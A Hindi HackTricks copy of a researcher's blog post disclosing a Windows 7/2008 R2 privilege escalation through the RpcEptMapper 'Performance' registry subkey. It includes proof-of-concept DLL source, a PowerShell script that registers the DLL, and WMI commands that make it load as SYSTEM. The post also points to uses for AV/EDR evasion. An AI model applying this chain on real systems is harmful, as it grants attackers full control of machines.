<details>

<summary><strong>AWS हैकिंग सीखें शून्य से लेकर हीरो तक</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप चाहते हैं कि आपकी **कंपनी का विज्ञापन HackTricks में दिखाई दे** या **HackTricks को PDF में डाउनलोड करें** तो [**सब्सक्रिप्शन प्लान्स**](https://github.com/sponsors/carlospolop) देखें!
* [**आधिकारिक PEASS & HackTricks स्वैग प्राप्त करें**](https://peass.creator-spring.com)
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह
* 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) में **शामिल हों** या [**telegram group**](https://t.me/peass) में या **Twitter** 🐦 पर मुझे **फॉलो** करें [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **HackTricks** के [**github repos**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) में PRs सबमिट करके अपनी हैकिंग ट्रिक्स शेयर करें।

</details>


**जानकारी कॉपी की गई** [**https://itm4n.github.io/windows-registry-rpceptmapper-eop/**](https://itm4n.github.io/windows-registry-rpceptmapper-eop/)

स्क्रिप्ट के आउटपुट के अनुसार, वर्तमान उपयोगकर्ता को दो रजिस्ट्री कुंजियों पर कुछ लिखने की अनुमतियां हैं:

* `HKLM\SYSTEM\CurrentControlSet\Services\Dnscache`
* `HKLM\SYSTEM\CurrentControlSet\Services\RpcEptMapper`

आइए `regedit` GUI का उपयोग करके `RpcEptMapper` सेवा की अनुमतियों की मैन्युअल जांच करें। _Advanced Security Settings_ विंडो के बारे में एक चीज जो मुझे वास्तव में पसंद है वह है _Effective Permissions_ टैब। आप किसी भी उपयोगकर्ता या समूह नाम का चयन कर सकते हैं और तुरंत देख सकते हैं कि इस प्रिंसिपल को कौन सी प्रभावी अनुमतियां दी गई हैं, बिना सभी ACEs की अलग से जांच किए। निम्नलिखित स्क्रीनशॉट कम विशेषाधिकार प्राप्त `lab-user` खाते के परिणाम दिखाता है।

![](https://itm4n.github.io/assets/posts/2020-11-12-windows-registry-rpceptmapper-eop/02\_regsitry-rpceptmapper-permissions.png)

अधिकांश अनुमतियां मानक हैं (उदाहरण के लिए: `Query Value`) लेकिन एक विशेष रूप से बाहर खड़ा है: `Create Subkey`। इस अनुमति का सामान्य नाम `AppendData/AddSubdirectory` है, जो बिल्कुल वही है जो स्क्रिप्ट द्वारा रिपोर्ट किया गया था:
```
Name              : RpcEptMapper
ImagePath         : C:\Windows\system32\svchost.exe -k RPCSS
User              : NT AUTHORITY\NetworkService
ModifiablePath    : {Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\RpcEptMapper}
IdentityReference : NT AUTHORITY\Authenticated Users
Permissions       : {ReadControl, AppendData/AddSubdirectory, ReadData/ListDirectory}
Status            : Running
UserCanStart      : True
UserCanRestart    : False

Name              : RpcEptMapper
ImagePath         : C:\Windows\system32\svchost.exe -k RPCSS
User              : NT AUTHORITY\NetworkService
ModifiablePath    : {Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\RpcEptMapper}
IdentityReference : BUILTIN\Users
Permissions       : {WriteExtendedAttributes, AppendData/AddSubdirectory, ReadData/ListDirectory}
Status            : Running
UserCanStart      : True
UserCanRestart    : False
```
इसका क्या मतलब है? इसका मतलब है कि हम सिर्फ `ImagePath` मान को संशोधित नहीं कर सकते। ऐसा करने के लिए, हमें `WriteData/AddFile` अनुमति की आवश्यकता होगी। इसके बजाय, हम केवल एक नई सबकी बना सकते हैं।

क्या इसका मतलब यह था कि यह वास्तव में एक झूठी सकारात्मकता थी? निश्चित रूप से नहीं। मज़ा शुरू होने दो!

## RTFM <a href="#rtfm" id="rtfm"></a>

इस बिंदु पर, हम जानते हैं कि हम `HKLM\SYSTEM\CurrentControlSet\Services\RpcEptMapper` के अंतर्गत मनमानी सबकीज़ बना सकते हैं लेकिन हम मौजूदा सबकीज़ और मानों को संशोधित नहीं कर सकते। ये पहले से मौजूद सबकीज़ `Parameters` और `Security` हैं, जो Windows सेवाओं के लिए काफी सामान्य हैं।

इसलिए, पहला प्रश्न जो मेरे मन में आया था: _क्या कोई अन्य पूर्वनिर्धारित सबकी - जैसे `Parameters` और `Security` - है जिसका उपयोग करके हम सेवा की कॉन्फ़िगरेशन को प्रभावी ढंग से संशोधित कर सकते हैं और किसी भी तरह से इसके व्यवहार को बदल सकते हैं?_

इस प्रश्न का उत्तर देने के लिए, मेरी प्रारंभिक योजना सभी मौजूदा कीज़ को गिनना और एक पैटर्न की पहचान करने की थी। विचार यह देखने का था कि कौन सी सबकीज़ सेवा की कॉन्फ़िगरेशन के लिए _महत्वपूर्ण_ हैं। मैंने सोचना शुरू किया कि मैं इसे PowerShell में कैसे लागू कर सकता हूँ और फिर परिणाम को कैसे सॉर्ट कर सकता हूँ। हालांकि, इससे पहले कि मैं ऐसा करता, मैंने सोचा कि क्या यह रजिस्ट्री संरचना पहले से ही दस्तावेज़ीकृत थी। इसलिए, मैंने `windows service configuration registry site:microsoft.com` जैसा कुछ गूगल किया और यहाँ पहला [परिणाम](https://docs.microsoft.com/en-us/windows-hardware/drivers/install/hklm-system-currentcontrolset-services-registry-tree) है जो निकला।

आशाजनक लगता है, है ना? पहली नज़र में, दस्तावेज़ीकरण पूर्ण और व्यापक नहीं लग रहा था। शीर्षक को देखते हुए, मैंने एक सेवा की कॉन्फ़िगरेशन को परिभाषित करने वाली सभी सबकीज़ और मानों का विस्तार से वृक्ष संरचना देखने की उम्मीद की थी लेकिन यह स्पष्ट रूप से वहाँ नहीं था।

फिर भी, मैंने प्रत्येक पैराग्राफ पर जल्दी से नज़र डाली। और, मैंने जल्दी से कीवर्ड "_**Performance**_" और "_**DLL**_" को देखा। "**Perfomance**" उपशीर्षक के अंतर्गत, हम निम्नलिखित पढ़ सकते हैं:

> **Performance**: _एक कुंजी जो वैकल्पिक प्रदर्शन मॉनिटरिंग के लिए जानकारी निर्दिष्ट करती है। इस कुंजी के तहत मान **ड्राइवर के प्रदर्शन DLL का नाम** और **उस DLL में निर्यात किए गए कुछ फ़ंक्शनों के नाम** निर्दिष्ट करते हैं। आप ड्राइवर की INF फ़ाइल में AddReg प्रविष्टियों का उपयोग करके इस सबकी में मान प्रविष्टियाँ जोड़ सकते हैं।_

इस छोटे पैराग्राफ के अनुसार, सैद्धांतिक रूप से कोई `Performance` सबकी का उपयोग करके एक ड्राइवर सेवा में एक DLL को पंजीकृत कर सकता है ताकि उसके प्रदर्शन की निगरानी की जा सके। **ठीक है, यह वास्तव में दिलचस्प है!** यह कुंजी `RpcEptMapper` सेवा के लिए डिफ़ॉल्ट रूप से मौजूद नहीं है इसलिए यह लगता है कि यह _बिल्कुल_ वही है जो हमें चाहिए। हालांकि, एक छोटी समस्या है, यह सेवा निश्चित रूप से एक ड्राइवर सेवा नहीं है। वैसे भी, यह कोशिश करने लायक है, लेकिन हमें पहले इस "_प्रदर्शन मॉनिटरिंग_" सुविधा के बारे में अधिक जानकारी चाहिए।

> **नोट:** Windows में, प्रत्येक सेवा का एक निर्दिष्ट `Type` होता है। एक सेवा का प्रकार निम्नलिखित मानों में से एक हो सकता है: `SERVICE_KERNEL_DRIVER (1)`, `SERVICE_FILE_SYSTEM_DRIVER (2)`, `SERVICE_ADAPTER (4)`, `SERVICE_RECOGNIZER_DRIVER (8)`, `SERVICE_WIN32_OWN_PROCESS (16)`, `SERVICE_WIN32_SHARE_PROCESS (32)` या `SERVICE_INTERACTIVE_PROCESS (256)`।

कुछ गूगलिंग के बाद, मैंने दस्तावेज़ीकरण में यह संसाधन पाया: [Creating the Application’s Performance Key](https://docs.microsoft.com/en-us/windows/win32/perfctrs/creating-the-applications-performance-key)।

पहले, एक अच्छी वृक्ष संरचना है जो सभी कीज़ और मानों को सूचीबद्ध करती है जिन्हें हमें बनाना है। फिर, विवरण निम्नलिखित महत्वपूर्ण जानकारी देता है:

* `Library` मान में **एक DLL का नाम या एक DLL के लिए पूर्ण पथ** हो सकता है।
* `Open`, `Collect`, और `Close` मान आपको उन **फ़ंक्शनों के नामों** को निर्दिष्ट करने की अनुमति देते हैं जिन्हें DLL द्वारा निर्यात किया जाना चाहिए।
* इन मानों का डेटा प्रकार `REG_SZ` है (या `Library` मान के लिए `REG_EXPAND_SZ` भी हो सकता है)।

यदि आप इस संसाधन में शामिल लिंक्स का अनुसरण करते हैं, तो आप इन फ़ंक्शनों के प्रोटोटाइप के साथ-साथ कुछ कोड नमूने भी पाएंगे: [Implementing OpenPerformanceData](https://docs.microsoft.com/en-us/windows/win32/perfctrs/implementing-openperformancedata)।
```
DWORD APIENTRY OpenPerfData(LPWSTR pContext);
DWORD APIENTRY CollectPerfData(LPWSTR pQuery, PVOID* ppData, LPDWORD pcbData, LPDWORD pObjectsReturned);
DWORD APIENTRY ClosePerfData();
```
सिद्धांत के साथ पर्याप्त हो चुका है, अब कुछ कोड लिखने का समय है!

## प्रूफ-ऑफ-कॉन्सेप्ट लिखना <a href="#writing-a-proof-of-concept" id="writing-a-proof-of-concept"></a>

दस्तावेज़ीकरण के माध्यम से मैं जो भी जानकारी एकत्र कर पाया, उसकी मदद से एक सरल प्रूफ-ऑफ-कॉन्सेप्ट DLL लिखना काफी सीधा होना चाहिए। लेकिन फिर भी, हमें एक योजना की आवश्यकता है!

जब मुझे किसी प्रकार की DLL हाइजैकिंग भेद्यता का शोषण करना होता है, तो मैं आमतौर पर एक सरल और कस्टम लॉग सहायक फ़ंक्शन के साथ शुरुआत करता हूँ। इस फ़ंक्शन का उद्देश्य कुछ महत्वपूर्ण जानकारी को फ़ाइल में लिखना है जब भी इसे आह्वान किया जाता है। आमतौर पर, मैं वर्तमान प्रक्रिया और माता-पिता प्रक्रिया की PID, प्रक्रिया चलाने वाले उपयोगकर्ता का नाम और संबंधित कमांड लाइन, और इस लॉग इवेंट को ट्रिगर करने वाले फ़ंक्शन का नाम लॉग करता हूँ। इस तरह, मुझे पता चलता है कि कोड का कौन सा हिस्सा निष्पादित हुआ था।

मेरे अन्य लेखों में, मैंने हमेशा विकास भाग को छोड़ दिया क्योंकि मैंने मान लिया था कि यह अधिक या कम स्पष्ट था। लेकिन, मैं चाहता हूँ कि मेरे ब्लॉग पोस्ट शुरुआती लोगों के लिए भी अनुकूल हों, इसलिए यहाँ एक विरोधाभास है। मैं यहाँ इस स्थिति का समाधान करूँगा और प्रक्रिया का विस्तार से वर्णन करूँगा। तो, चलिए Visual Studio खोलते हैं और एक नया "_C++ Console App_" प्रोजेक्ट बनाते हैं। ध्यान दें कि मैंने एक "_Dynamic-Link Library (DLL)_" प्रोजेक्ट बना सकता था लेकिन मुझे वास्तव में यह आसान लगता है कि बस एक कंसोल ऐप के साथ शुरुआत करूँ।

यहाँ Visual Studio द्वारा उत्पन्न प्रारंभिक कोड है:
```c
#include <iostream>

int main()
{
std::cout << "Hello World!\n";
}
```
बेशक, यह वह नहीं है जो हम चाहते हैं। हमें एक EXE नहीं, बल्कि एक DLL बनाना है, इसलिए हमें `main` फ़ंक्शन को `DllMain` से बदलना होगा। इस फ़ंक्शन के लिए एक स्केलेटन कोड आपको दस्तावेज़ीकरण में मिल सकता है: [Initialize a DLL](https://docs.microsoft.com/en-us/cpp/build/run-time-library-behavior#initialize-a-dll)।
```c
#include <Windows.h>

extern "C" BOOL WINAPI DllMain(HINSTANCE const instance, DWORD const reason, LPVOID const reserved)
{
switch (reason)
{
case DLL_PROCESS_ATTACH:
Log(L"DllMain"); // See log helper function below
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
case DLL_PROCESS_DETACH:
break;
}
return TRUE;
}
```
```markdown
इसके साथ-साथ, हमें प्रोजेक्ट की सेटिंग्स में भी बदलाव करने की जरूरत है ताकि यह निर्दिष्ट किया जा सके कि कंपाइल की गई फाइल एक DLL होनी चाहिए ना कि EXE. ऐसा करने के लिए, आप प्रोजेक्ट प्रॉपर्टीज़ को खोल सकते हैं और, "**General**" सेक्शन में, "**Dynamic Library (.dll)**" को "**Configuration Type**" के रूप में चुन सकते हैं। टाइटल बार के ठीक नीचे, आप "**All Configurations**" और "**All Platforms**" भी चुन सकते हैं ताकि यह सेटिंग वैश्विक रूप से लागू की जा सके।

इसके बाद, मैं अपना कस्टम लॉग हेल्पर फंक्शन जोड़ता हूँ।
```
```c
#include <Lmcons.h> // UNLEN + GetUserName
#include <tlhelp32.h> // CreateToolhelp32Snapshot()
#include <strsafe.h>

void Log(LPCWSTR pwszCallingFrom)
{
LPWSTR pwszBuffer, pwszCommandLine;
WCHAR wszUsername[UNLEN + 1] = { 0 };
SYSTEMTIME st = { 0 };
HANDLE hToolhelpSnapshot;
PROCESSENTRY32 stProcessEntry = { 0 };
DWORD dwPcbBuffer = UNLEN, dwBytesWritten = 0, dwProcessId = 0, dwParentProcessId = 0, dwBufSize = 0;
BOOL bResult = FALSE;

// Get the command line of the current process
pwszCommandLine = GetCommandLine();

// Get the name of the process owner
GetUserName(wszUsername, &dwPcbBuffer);

// Get the PID of the current process
dwProcessId = GetCurrentProcessId();

// Get the PID of the parent process
hToolhelpSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
stProcessEntry.dwSize = sizeof(PROCESSENTRY32);
if (Process32First(hToolhelpSnapshot, &stProcessEntry)) {
do {
if (stProcessEntry.th32ProcessID == dwProcessId) {
dwParentProcessId = stProcessEntry.th32ParentProcessID;
break;
}
} while (Process32Next(hToolhelpSnapshot, &stProcessEntry));
}
CloseHandle(hToolhelpSnapshot);

// Get the current date and time
GetLocalTime(&st);

// Prepare the output string and log the result
dwBufSize = 4096 * sizeof(WCHAR);
pwszBuffer = (LPWSTR)malloc(dwBufSize);
if (pwszBuffer)
{
StringCchPrintf(pwszBuffer, dwBufSize, L"[%.2u:%.2u:%.2u] - PID=%d - PPID=%d - USER='%s' - CMD='%s' - METHOD='%s'\r\n",
st.wHour,
st.wMinute,
st.wSecond,
dwProcessId,
dwParentProcessId,
wszUsername,
pwszCommandLine,
pwszCallingFrom
);

LogToFile(L"C:\\LOGS\\RpcEptMapperPoc.log", pwszBuffer);

free(pwszBuffer);
}
}
```
फिर, हम DLL को उन तीन फंक्शन्स से भर सकते हैं जो हमने डॉक्यूमेंटेशन में देखे थे। डॉक्यूमेंटेशन यह भी कहता है कि अगर सफल हो, तो उन्हें `ERROR_SUCCESS` लौटाना चाहिए।
```c
DWORD APIENTRY OpenPerfData(LPWSTR pContext)
{
Log(L"OpenPerfData");
return ERROR_SUCCESS;
}

DWORD APIENTRY CollectPerfData(LPWSTR pQuery, PVOID* ppData, LPDWORD pcbData, LPDWORD pObjectsReturned)
{
Log(L"CollectPerfData");
return ERROR_SUCCESS;
}

DWORD APIENTRY ClosePerfData()
{
Log(L"ClosePerfData");
return ERROR_SUCCESS;
}
```
ठीक है, तो प्रोजेक्ट अब उचित रूप से कॉन्फ़िगर किया गया है, `DllMain` लागू किया गया है, हमारे पास एक लॉग सहायक फ़ंक्शन और तीन आवश्यक फ़ंक्शन हैं। हालांकि, एक अंतिम चीज़ अभी भी गायब है। यदि हम इस कोड को कंपाइल करते हैं, `OpenPerfData`, `CollectPerfData` और `ClosePerfData` केवल आंतरिक फ़ंक्शन के रूप में उपलब्ध होंगे इसलिए हमें उन्हें **निर्यात** करने की आवश्यकता है। यह कई तरीकों से हासिल किया जा सकता है। उदाहरण के लिए, आप एक [DEF](https://docs.microsoft.com/en-us/cpp/build/exporting-from-a-dll-using-def-files) फ़ाइल बना सकते हैं और फिर प्रोजेक्ट को उचित रूप से कॉन्फ़िगर कर सकते हैं। हालांकि, मुझे `__declspec(dllexport)` कीवर्ड ([दस्तावेज़](https://docs.microsoft.com/en-us/cpp/build/exporting-from-a-dll-using-declspec-dllexport)) का उपयोग करना पसंद है, विशेष रूप से इस तरह के छोटे प्रोजेक्ट के लिए। इस तरह, हमें केवल स्रोत कोड की शुरुआत में तीन फ़ंक्शनों को घोषित करना होगा।
```c
extern "C" __declspec(dllexport) DWORD APIENTRY OpenPerfData(LPWSTR pContext);
extern "C" __declspec(dllexport) DWORD APIENTRY CollectPerfData(LPWSTR pQuery, PVOID* ppData, LPDWORD pcbData, LPDWORD pObjectsReturned);
extern "C" __declspec(dllexport) DWORD APIENTRY ClosePerfData();
```
यदि आप पूरा कोड देखना चाहते हैं, तो मैंने इसे [यहाँ](https://gist.github.com/itm4n/253c5937f9b3408b390d51ac068a4d12) अपलोड किया है।

अंत में, हम _**Release/x64**_ का चयन कर सकते हैं और "_**Build the solution**_" कर सकते हैं। इससे हमारी DLL फाइल बनेगी: `.\DllRpcEndpointMapperPoc\x64\Release\DllRpcEndpointMapperPoc.dll`.

## PoC का परीक्षण <a href="#testing-the-poc" id="testing-the-poc"></a>

आगे बढ़ने से पहले, मैं हमेशा यह सुनिश्चित करता हूँ कि मेरा पेलोड ठीक से काम कर रहा है, इसे अलग से परीक्षण करके। यहाँ बिताया गया थोड़ा समय बाद में बहुत समय बचा सकता है, यह रोककर कि आप किसी काल्पनिक डीबग चरण के दौरान खरगोश के बिल में न चले जाएँ। ऐसा करने के लिए, हम बस `rundll32.exe` का उपयोग कर सकते हैं और DLL का नाम और निर्यात किए गए फंक्शन का नाम पैरामीटर के रूप में पास कर सकते हैं।
```
C:\Users\lab-user\Downloads\>rundll32 DllRpcEndpointMapperPoc.dll,OpenPerfData
```
बहुत अच्छा, लॉग फ़ाइल बनाई गई थी और, अगर हम इसे खोलें, तो हम दो प्रविष्टियाँ देख सकते हैं। पहली प्रविष्टि तब लिखी गई थी जब DLL को `rundll32.exe` द्वारा लोड किया गया था। दूसरी प्रविष्टि तब लिखी गई थी जब `OpenPerfData` को कॉल किया गया था। दिखने में अच्छा है! ![:slightly_smiling_face:](https://github.githubassets.com/images/icons/emoji/unicode/1f642.png)
```
[21:25:34] - PID=3040 - PPID=2964 - USER='lab-user' - CMD='rundll32  DllRpcEndpointMapperPoc.dll,OpenPerfData' - METHOD='DllMain'
[21:25:34] - PID=3040 - PPID=2964 - USER='lab-user' - CMD='rundll32  DllRpcEndpointMapperPoc.dll,OpenPerfData' - METHOD='OpenPerfData'
```
अब हम वास्तविक सुरक्षा दोष पर ध्यान केंद्रित कर सकते हैं और आवश्यक रजिस्ट्री कुंजी और मानों को बनाना शुरू कर सकते हैं। हम या तो इसे मैन्युअल रूप से `reg.exe` / `regedit.exe` का उपयोग करके या एक स्क्रिप्ट के साथ प्रोग्रामेटिक रूप से कर सकते हैं। चूंकि मैंने पहले ही अपने प्रारंभिक अनुसंधान के दौरान मैन्युअल चरणों के माध्यम से जाना है, मैं एक PowerShell स्क्रिप्ट के साथ वही काम करने का एक साफ तरीका दिखाऊंगा। वैसे भी, PowerShell में रजिस्ट्री कुंजी और मान बनाना `New-Item` और `New-ItemProperty` को कॉल करने जितना आसान है, है ना? ![:thinking:](https://github.githubassets.com/images/icons/emoji/unicode/1f914.png)

`Requested registry access is not allowed`… हम्म्म, ठीक है… ऐसा लगता है कि यह इतना आसान नहीं होगा। ![:stuck\_out\_tongue:](https://github.githubassets.com/images/icons/emoji/unicode/1f61b.png)

मैंने वास्तव में इस मुद्दे की जांच नहीं की लेकिन मेरा अनुमान है कि जब हम `New-Item` को कॉल करते हैं, `powershell.exe` वास्तव में कुछ झंडे के साथ माता-पिता रजिस्ट्री कुंजी को खोलने की कोशिश करता है जो हमारे पास नहीं हैं।

वैसे भी, अगर बिल्ट-इन cmdlets काम नहीं करते हैं, तो हम हमेशा एक स्तर नीचे जा सकते हैं और सीधे DotNet फंक्शन्स को इन्वोक कर सकते हैं। वास्तव में, निम्नलिखित कोड के साथ PowerShell में भी रजिस्ट्री कुंजी बनाई जा सकती है।
```
[Microsoft.Win32.Registry]::LocalMachine.CreateSubKey("SYSTEM\CurrentControlSet\Services\RpcEptMapper\Performance")
```
यहाँ हम शुरू करते हैं! अंत में, मैंने उचित कुंजी और मानों को बनाने, कुछ उपयोगकर्ता इनपुट की प्रतीक्षा करने और अंत में सब कुछ साफ करके समाप्त करने के लिए निम्नलिखित स्क्रिप्ट तैयार की।
```
$ServiceKey = "SYSTEM\CurrentControlSet\Services\RpcEptMapper\Performance"

Write-Host "[*] Create 'Performance' subkey"
[void] [Microsoft.Win32.Registry]::LocalMachine.CreateSubKey($ServiceKey)
Write-Host "[*] Create 'Library' value"
New-ItemProperty -Path "HKLM:$($ServiceKey)" -Name "Library" -Value "$($pwd)\DllRpcEndpointMapperPoc.dll" -PropertyType "String" -Force | Out-Null
Write-Host "[*] Create 'Open' value"
New-ItemProperty -Path "HKLM:$($ServiceKey)" -Name "Open" -Value "OpenPerfData" -PropertyType "String" -Force | Out-Null
Write-Host "[*] Create 'Collect' value"
New-ItemProperty -Path "HKLM:$($ServiceKey)" -Name "Collect" -Value "CollectPerfData" -PropertyType "String" -Force | Out-Null
Write-Host "[*] Create 'Close' value"
New-ItemProperty -Path "HKLM:$($ServiceKey)" -Name "Close" -Value "ClosePerfData" -PropertyType "String" -Force | Out-Null

Read-Host -Prompt "Press any key to continue"

Write-Host "[*] Cleanup"
Remove-ItemProperty -Path "HKLM:$($ServiceKey)" -Name "Library" -Force
Remove-ItemProperty -Path "HKLM:$($ServiceKey)" -Name "Open" -Force
Remove-ItemProperty -Path "HKLM:$($ServiceKey)" -Name "Collect" -Force
Remove-ItemProperty -Path "HKLM:$($ServiceKey)" -Name "Close" -Force
[Microsoft.Win32.Registry]::LocalMachine.DeleteSubKey($ServiceKey)
```
अंतिम चरण अब, **हम RPC Endpoint Mapper सेवा को हमारे Performace DLL को लोड करने के लिए कैसे चालाकी से प्रेरित करें?** दुर्भाग्यवश, मैंने उन सभी विभिन्न चीजों का ट्रैक नहीं रखा है जिन्हें मैंने आजमाया है। इस ब्लॉग पोस्ट के संदर्भ में यह बताना बहुत रोचक होता कि कभी-कभी शोध कितना थकाऊ और समय लेने वाला हो सकता है। वैसे भी, रास्ते में मुझे एक चीज मिली है कि आप WMI (_Windows Management Instrumentation_) का उपयोग करके _Perfomance Counters_ की क्वेरी कर सकते हैं, जो आखिरकार बहुत आश्चर्यजनक नहीं है। अधिक जानकारी यहाँ है: [_WMI Performance Counter Types_](https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmi-performance-counter-types).

> _Counter types गुणों के लिए CounterType qualifier के रूप में प्रकट होते हैं_ [_Win32\_PerfRawData_](https://docs.microsoft.com/en-us/windows/win32/cimwin32prov/win32-perfrawdata) _कक्षाओं में, और गुणों के लिए CookingType qualifier के रूप में_ [_Win32\_PerfFormattedData_](https://docs.microsoft.com/en-us/windows/win32/cimwin32prov/win32-perfformatteddata) _कक्षाओं में।_

तो, मैंने सबसे पहले PowerShell का उपयोग करके _Performace Data_ से संबंधित WMI कक्षाओं को निम्नलिखित कमांड का उपयोग करके गिना।
```
Get-WmiObject -List | Where-Object { $_.Name -Like "Win32_Perf*" }
```
![](https://itm4n.github.io/assets/posts/2020-11-12-windows-registry-rpceptmapper-eop/12_powershell-get-wmiobject.gif)

और, मैंने देखा कि मेरी लॉग फाइल लगभग तुरंत बन गई थी! यहाँ फाइल की सामग्री है।
```
[21:17:49] - PID=4904 - PPID=664 - USER='SYSTEM' - CMD='C:\Windows\system32\wbem\wmiprvse.exe' - METHOD='DllMain'
[21:17:49] - PID=4904 - PPID=664 - USER='SYSTEM' - CMD='C:\Windows\system32\wbem\wmiprvse.exe' - METHOD='OpenPerfData'
[21:17:49] - PID=4904 - PPID=664 - USER='SYSTEM' - CMD='C:\Windows\system32\wbem\wmiprvse.exe' - METHOD='CollectPerfData'
[21:17:49] - PID=4904 - PPID=664 - USER='SYSTEM' - CMD='C:\Windows\system32\wbem\wmiprvse.exe' - METHOD='CollectPerfData'
[21:17:49] - PID=4904 - PPID=664 - USER='SYSTEM' - CMD='C:\Windows\system32\wbem\wmiprvse.exe' - METHOD='CollectPerfData'
[21:17:49] - PID=4904 - PPID=664 - USER='SYSTEM' - CMD='C:\Windows\system32\wbem\wmiprvse.exe' - METHOD='CollectPerfData'
[21:17:49] - PID=4904 - PPID=664 - USER='SYSTEM' - CMD='C:\Windows\system32\wbem\wmiprvse.exe' - METHOD='CollectPerfData'
[21:17:49] - PID=4904 - PPID=664 - USER='SYSTEM' - CMD='C:\Windows\system32\wbem\wmiprvse.exe' - METHOD='CollectPerfData'
[21:17:49] - PID=4904 - PPID=664 - USER='SYSTEM' - CMD='C:\Windows\system32\wbem\wmiprvse.exe' - METHOD='CollectPerfData'
[21:17:49] - PID=4904 - PPID=664 - USER='SYSTEM' - CMD='C:\Windows\system32\wbem\wmiprvse.exe' - METHOD='CollectPerfData'
[21:17:49] - PID=4904 - PPID=664 - USER='SYSTEM' - CMD='C:\Windows\system32\wbem\wmiprvse.exe' - METHOD='CollectPerfData'
[21:17:49] - PID=4904 - PPID=664 - USER='SYSTEM' - CMD='C:\Windows\system32\wbem\wmiprvse.exe' - METHOD='CollectPerfData'
[21:17:49] - PID=4904 - PPID=664 - USER='SYSTEM' - CMD='C:\Windows\system32\wbem\wmiprvse.exe' - METHOD='CollectPerfData'
```
मुझे `RpcEptMapper` सेवा के संदर्भ में `NETWORK SERVICE` के रूप में मनमाने कोड निष्पादन की उम्मीद थी, लेकिन, ऐसा लगता है कि मुझे अपेक्षा से कहीं बेहतर परिणाम मिला है। मैंने वास्तव में `WMI` सेवा के संदर्भ में मनमाने कोड निष्पादन प्राप्त किया, जो `LOCAL SYSTEM` के रूप में चलती है। यह कितना अद्भुत है ना?! ![:sunglasses:](https://github.githubassets.com/images/icons/emoji/unicode/1f60e.png)

> **ध्यान दें:** अगर मुझे `NETWORK SERVICE` के रूप में मनमाने कोड निष्पादन मिला होता, तो मैं जेम्स फोर्शॉ द्वारा कुछ महीने पहले इस ब्लॉग पोस्ट में दिखाए गए चाल की बदौलत `LOCAL SYSTEM` खाते से केवल एक टोकन दूर होता: [Sharing a Logon Session a Little Too Much](https://www.tiraniddo.dev/2020/04/sharing-logon-session-little-too-much.html).

मैंने प्रत्येक WMI क्लास को अलग से प्राप्त करने की भी कोशिश की और मैंने बिल्कुल वही परिणाम देखा।
```
Get-WmiObject Win32_Perf
Get-WmiObject Win32_PerfRawData
Get-WmiObject Win32_PerfFormattedData
```
## निष्कर्ष <a href="#conclusion" id="conclusion"></a>

मुझे नहीं पता कि यह सुरक्षा भेद्यता इतने लंबे समय तक कैसे अनदेखी गई। एक स्पष्टीकरण यह हो सकता है कि अन्य उपकरण शायद रजिस्ट्री में पूर्ण लेखन पहुँच की तलाश करते थे, जबकि `AppendData/AddSubdirectory` इस मामले में पर्याप्त था। "मिसकॉन्फ़िगरेशन" के बारे में, मैं मानूंगा कि रजिस्ट्री कुंजी एक विशेष उद्देश्य के लिए इस तरह सेट की गई थी, हालांकि मैं किसी भी ठोस परिदृश्य के बारे में नहीं सोच सकता जिसमें उपयोगकर्ताओं को किसी सेवा की कॉन्फ़िगरेशन को संशोधित करने की कोई भी अनुमति हो।

मैंने इस सुरक्षा भेद्यता के बारे में सार्वजनिक रूप से लिखने का निर्णय दो कारणों से लिया। पहला यह है कि मैंने वास्तव में इसे सार्वजनिक कर दिया था - बिना शुरुआत में इसे महसूस किए - जिस दिन मैंने `GetModfiableRegistryPath` फ़ंक्शन के साथ मेरी PrivescCheck स्क्रिप्ट को अपडेट किया था, जो कई महीने पहले था। दूसरा यह है कि प्रभाव कम है। इसके लिए स्थानीय पहुँच की आवश्यकता होती है और यह केवल पुराने संस्करणों के Windows पर प्रभाव डालता है जिनका समर्थन अब नहीं किया जाता है (जब तक आपने विस्तारित समर्थन नहीं खरीदा है...). इस बिंदु पर, यदि आप अभी भी Windows 7 / Server 2008 R2 का उपयोग कर रहे हैं बिना इन मशीनों को पहले नेटवर्क में ठीक से अलग किए, तो एक हमलावर को SYSTEM विशेषाधिकारों से रोकना शायद आपकी सबसे कम चिंताओं में से एक है।

इस विशेषाधिकार वृद्धि सुरक्षा भेद्यता के उपाख्यानी पक्ष के अलावा, मुझे लगता है कि यह "Perfomance" रजिस्ट्री सेटिंग पोस्ट एक्सप्लॉइटेशन, लेटरल मूवमेंट और AV/EDR इवेज़न के लिए वास्तव में दिलचस्प अवसर खोलती है। मेरे पास पहले से ही कुछ विशेष परिदृश्य हैं लेकिन मैंने अभी तक उनमें से किसी का भी परीक्षण नहीं किया है। जारी रखें?...

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप अपनी **कंपनी का विज्ञापन HackTricks में देखना चाहते हैं** या **HackTricks को PDF में डाउनलोड करना चाहते हैं** तो [**सब्सक्रिप्शन प्लान्स**](https://github.com/sponsors/carlospolop) देखें!
* [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा संग्रह विशेष [**NFTs**](https://opensea.io/collection/the-peass-family)
* 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) में **शामिल हों** या [**telegram group**](https://t.me/peass) या **Twitter** पर मुझे 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)** का अनुसरण करें.**
